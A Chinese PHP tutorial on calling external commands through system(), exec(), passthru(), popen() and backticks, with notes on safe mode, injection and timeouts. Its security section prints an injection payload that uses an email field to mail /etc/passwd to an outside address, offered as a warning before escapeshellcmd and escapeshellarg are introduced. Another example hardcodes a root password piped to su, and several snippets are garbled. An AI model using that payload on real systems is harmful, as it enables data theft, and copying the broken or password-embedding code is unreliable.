
<!-- TOC -->

- [区别：](#区别)
- [是否可以?](#是否可以)
- [前提条件](#前提条件)
- [如何做?](#如何做)
- [1) 用PHP提供的专门函数](#1-用php提供的专门函数)
- [2) 用popen()函数打开进程](#2-用popen函数打开进程)
- [3) 用反撇号(`，也就是键盘上ESC键下面的那个，和~在同一个上面)](#3-用反撇号也就是键盘上esc键下面的那个和在同一个上面)
- [要考虑些什么?](#要考虑些什么)

<!-- /TOC -->
> 详细的介绍了关于PHP exec system passthru系统函数用法与安全以及其它应用功能，有需要的朋友参考一下。区别:system() 输出并返回最后一行shell结果。exec() 不输出结果，返回最后一行shell结果，所有结果详细的介绍了关于PHP exec system passthru系统函数用法与安全以及其它应用功能，有需要的朋友参考一下。

#### 区别： ####

system() 输出并返回最后一行shell结果。

exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。

passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。

相同点：都可以获得命令执行的状态码


    demo:
    //system('dir');
    // exec ('dir');
    // passthru ('dir');
    // echo `dir`;
PHP作为一种服务器端的脚本语言，象编写简单，或者是复杂的动态网页这样的任务，它完全能够胜任。但事情不总是如此，有时为了实现某个功能，必须借助于操作系统的外部程序(或者称之为命令)，这样可以做到事半功倍。

那么，是否可以在PHP脚本中调用外部命令呢?如果能，如何去做呢?有些什么方面的顾虑呢?相信你看了本文后，肯定能够回答这些问题了。

#### 是否可以? ####

答案是肯定的。PHP和其它的程序设计语言一样，完全可以在程序内调用外部命令，并且是很简单的：只要用一个或几个函数即可。

#### 前提条件 ####

由于PHP基本是用于WEB程序开发的，所以安全性成了人们考虑的一个重要方面。于是PHP的设计者们给PHP加了一个门：安全模式。如果运行在安全模式下，那么PHP脚本中将受到如下四个方面的限制：

> 执行外部命令
> 
> 在打开文件时有些限制
> 
> 连接MySQL数据库
> 
> 基于HTTP的认证

在 安全模式下，只有在特定目录中的外部程序才可以被执行，对其它程序的调用将被拒绝。这个目录可以在php.ini文件中用 safe_mode_exec_dir指令，或在编译PHP是加上--with-exec-dir选项来指定，默认是 /usr/local/php/bin。

如果你调用一个应该可以输出结果的外部命令(意思是PHP脚本没有错误)，得到的却是一片空白，那么很可能你的网管已经把PHP运行在安全模式下了。

#### 如何做? ####

在PHP中调用外部命令，可以用如下三种方法来实现：

#### 1) 用PHP提供的专门函数 ####

PHP提供共了3个专门的执行外部命令的函数：system()，exec()，passthru()。

system()

原型：string system (string command [, int return_var])

system()函数很其它语言中的差不多，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。

例子：

    <?php
	system("/usr/local/bin/webalizer/webalizer");  
    exec()
原型：string exec (string command [, string array [, int return_var]])

exec()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。虽然它只返回命令结果的最后一行，但用第二个参数array 可以得到完整的结果，方法是把结果逐行追加到array的结尾处。所以如果array不是空的，在调用之前最好用unset()最它清掉。只有指定了第二 个参数时，才可以用第三个参数，用来取得命令执行的状态码。

例子：
    <?php
    exec("/bin/ls -l");
    exec("/bin/ls -l", $res);
    exec("/bin/ls -l", $res, $rc);
	passthru()
原型：void passthru (string command [, int return_var])

passthru ()只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上。所以**passthru()**函数经常用来调用象pbmplus (Unix下的一个处理图片的工具，输出二进制的原始图片的流)这样的程序。同样它也可以得到命令执行的状态码。

例子：

    header("Content-type: image/gif");
    passthru("./ppmtogif hunte.ppm");
    ?>
#### 2) 用popen()函数打开进程 ####

上面的方法只能简单地执行命令，却不能与命令交互。但有些时候必须向命令输入一些东西，如在增加Linux的系统用户时，要调用su来把当前用户换到root才行，而su命令必须要在命令行上输入root的密码。这种情况下，用上面提到的方法显然是不行的。

popen()函数打开一个进程管道来执行给定的命令，返回一个文件句柄。既然返回的是一个文件句柄，那么就可以对它读和写了。在PHP3中，对这种句柄只能做单一 的操作模式，要么写，要么读;从PHP4开始，可以同时读和写了。除非这个句柄是以一种模式(读或写)打开的，否则必须调用pclose()函数来关闭 它。

例子1：

    $fp=popen("/bin/ls -l", "r");
    ?>
例子2(本例来自PHP中国联盟网站http://www.phpx.com/show.php?d=col&i=51)：

    /* PHP中如何增加一个系统用户
    下面是一段例程，增加一个名字为james的用户,
    root密码是 verygood。仅供参考
    */
    $sucommand = "su --login root --command";
    $useradd = "useradd ";
    $rootpasswd = "verygood";
    $user = "james";
    $user_add = sprintf("%s "%s %s"",$sucommand,$useradd,$user);
    $fp = @popen($user_add,"w");
    @fputs($fp,$rootpasswd);
    @pclose($fp);
    ?>
#### 3) 用反撇号(`，也就是键盘上ESC键下面的那个，和~在同一个上面) ####

这个方法以前没有归入PHP的文档，是作为一个秘技存在的。方法很简单，用两个反撇号把要执行的命令括起来作为一个表达式，这个表达式的值就是命令执行的结果。如：

    $res='/bin/ls -l';
    echo '
    '.$res.'
    ';
    ?>
这个脚本的输出就象：

    hunte.gif
    hunte.ppm
    jpg.htm
    jpg.jpg
    passthru.php
#### 要考虑些什么? ####

**要考虑两个问题：安全性和超时。**

先看**安全性**。比如，你有一家小型的网上商店，所以可以出售的产品列表放在一个文件中。你编写了一个有表单的HTML文件，让你的用户输入他们的EMAIL地 址，然后把这个产品列表发给他们。假设你没有使用PHP的mail()函数(或者从未听说过)，你就调用Linux/Unix系统的mail程序来发送这 个文件。程序就象这样：

    <?php
    system("mail $to < products.txt");
    echo "我们的产品目录已经发送到你的信箱：$to";
    
用这段代码，一般的用户不会产生什么危险，但实际上存在着非常大的安全漏洞。如果有个恶意的用户输入了这样一个EMAIL地址：

    '--bla ; mail someone@domain.com < /etc/passwd ;'
那么这条命令最终变成：

    'mail --bla ; mail someone@domain.com < /etc/passwd ; < products.txt'
我相信，无论哪个网络管理人员见到这样的命令，都会吓出一身冷汗来。

幸好，PHP为我们提供了两个函数：**EscapeShellCmd**()**和EscapeShellArg**()。**函数EscapeShellCmd把一个字符串** 中所有可能瞒过Shell而去执行另外一个命令的字符转义。这些字符在Shell中是有特殊含义的，象分号()，重定向(>)和从文件读入 (<)等。函数EscapeShellArg是用来处理命令的参数的。它在给定的字符串两边加上单引号，并把字符串中的单引号转义，这样这个字符串 就可以安全地作为命令的参数。

再来看看超时问题。如果要执行的命令要花费很长的时间，那么应该把这个命令放到系统的后台去运 行。但在默认情况下，**象system**()等函数要等到这个命令运行完才返回(实际上是要等命令的输出结果)，这肯定会引起PHP脚本的超时。解决的办法是 把命令的输出重定向到另外一个文件或流中，如：

    <?php
	system("/usr/local/bin/order_proc > /tmp/null &");

----
@tsingchan    